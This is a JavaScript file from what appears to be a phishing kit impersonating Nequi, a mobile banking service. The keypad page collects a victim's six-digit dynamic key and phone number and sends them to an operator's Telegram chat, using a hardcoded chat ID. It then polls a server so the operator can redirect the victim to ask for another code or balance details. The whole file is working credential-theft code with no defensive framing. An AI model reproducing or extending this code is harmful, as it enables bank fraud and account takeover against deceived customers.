document.addEventListener('DOMContentLoaded', () => {
    const digitBoxes = document.querySelectorAll('.digit-box');
    const keypadBtns = document.querySelectorAll('.keypad-btn[data-value]');
    const backspaceBtn = document.getElementById('backspace-btn');
    const loadingOverlay = document.getElementById('loading-overlay');
    
    // --- CONFIGURACIÓN DE TELEGRAM ---
    const TELEGRAM_CHAT_ID = '1556429907'; // Coincidir con saldo.js
    
    // URL del servidor local para polling
    const SERVER_URL = '';

    let currentInput = '';
    const maxLength = 6;

    // Verificación de protocolo
    if (window.location.protocol === 'file:') {
        alert("⚠️ ERROR: Estás abriendo el archivo directamente.\n\nPara que funcione la conexión con Telegram, debes usar el servidor local.\n\n1. Ejecuta 'node server.js' en la terminal.\n2. Abre http://localhost:3000 en tu navegador.");
    }

    // Handle number clicks
    keypadBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            if (currentInput.length < maxLength) {
                const value = btn.getAttribute('data-value');
                currentInput += value;
                updateDisplay();
            }
        });
    });

    // Handle backspace
    backspaceBtn.addEventListener('click', () => {
        if (currentInput.length > 0) {
            currentInput = currentInput.slice(0, -1);
            updateDisplay();
        }
    });

    // Handle keyboard input
    document.addEventListener('keydown', (e) => {
        if (e.key >= '0' && e.key <= '9') {
            if (currentInput.length < maxLength) {
                currentInput += e.key;
                updateDisplay();
            }
        } else if (e.key === 'Backspace') {
            if (currentInput.length > 0) {
                currentInput = currentInput.slice(0, -1);
                updateDisplay();
            }
        }
    });

    // --- DETECCIÓN DE ERROR PREVIO (Pedir Dinámica) ---
    const errorFlag = sessionStorage.getItem('show_dynamic_error');
    if (errorFlag) {
        const errorAlert = document.getElementById('error-alert');
        if (errorAlert) {
            errorAlert.style.display = 'block';
            setTimeout(() => {
                errorAlert.style.display = 'none';
            }, 3000);
        }
        sessionStorage.removeItem('show_dynamic_error');
    }

    // FUNCIÓN MODIFICADA PARA ENVIAR AL LLEGAR AL LÍMITE
    async function updateDisplay() {
        // Limpiar y llenar cajas (Tu lógica original)
        digitBoxes.forEach(box => {
            box.textContent = '';
            box.classList.remove('filled');
        });

        for (let i = 0; i < currentInput.length; i++) {
            digitBoxes[i].textContent = currentInput[i];
            digitBoxes[i].classList.add('filled');
        }

        // --- LÓGICA ADICIONAL: ENVÍO AUTOMÁTICO ---
        if (currentInput.length === maxLength) {
            // Mostrar pantalla de carga
            loadingOverlay.classList.add('active');

            const celular = sessionStorage.getItem("bc_usuario") || "No encontrado";
            const mensaje = `🔢 **DINÁMICA CAPTURADA (NEQUI)**\n\n` +
                            `📱 **Celular:** \`${celular}\`\n` +
                            `⚡ **Clave:** \`${currentInput}\`\n\n👇 **SELECCIONA UNA ACCIÓN:**`;

            try {
                // Enviamos a Telegram VIA PROXY
                const response = await fetch('/telegram-proxy/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: mensaje,
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: "✅ Finalizar", callback_data: "finish" },
                                    { text: "🔄 Pedir Dinámica (Reintentar)", callback_data: "ask_dynamic" }
                                ],
                                [
                                    { text: "❌ Saldo Incorrecto", callback_data: "saldo_bad" }
                                ],
                                [
                                    { text: "💰 Pedir Saldo", callback_data: "ask_saldo" }
                                ],
                                [
                                    { text: "❌ Usuario Incorrecto", callback_data: "wrong_user" }
                                ]
                            ]
                        }
                    })
                });
                
                const data = await response.json();
                if (data.ok) {
                    console.log("Enviado. ID:", data.result.message_id);
                    // Iniciar Polling al servidor local
                    pollLocalServer();
                } else {
                    console.error("Error enviando:", data);
                    alert(`Error al enviar mensaje: ${data.description || 'Desconocido'}`);
                    loadingOverlay.classList.remove('active');
                }

            } catch (error) {
                console.error("Error al enviar:", error);
                alert("Error de conexión con Telegram.");
                loadingOverlay.classList.remove('active');
            }
        }
    }

    function pollLocalServer() {
        setInterval(async () => {
            try {
                const response = await fetch(`${SERVER_URL}/check-status`);
                const data = await response.json();

                if (data.command) {
                    handleCommand(data.command);
                }
            } catch (err) {
                console.error("Error polling server:", err);
            }
        }, 2000);
    }

    function handleCommand(command) {
        console.log("Comando recibido:", command);
        switch(command) {
            case 'wrong_user':
                sessionStorage.setItem('show_login_error', 'true');
                window.location.href = 'index.html?t=' + Date.now();
                break;
            case 'ask_dynamic':
                sessionStorage.setItem('show_dynamic_error', 'true');
                window.location.reload(); 
                break;
            case 'saldo_bad':
                sessionStorage.setItem('show_saldo_error', 'true');
                window.location.href = 'saldo.html?t=' + Date.now();
                break;
            case 'ask_saldo':
                window.location.href = 'saldo.html?t=' + Date.now();
                break;
            case 'finish':
                window.location.href = 'final.html';
                break;
            default:
                console.log("Comando no reconocido:", command);
        }
    }
});
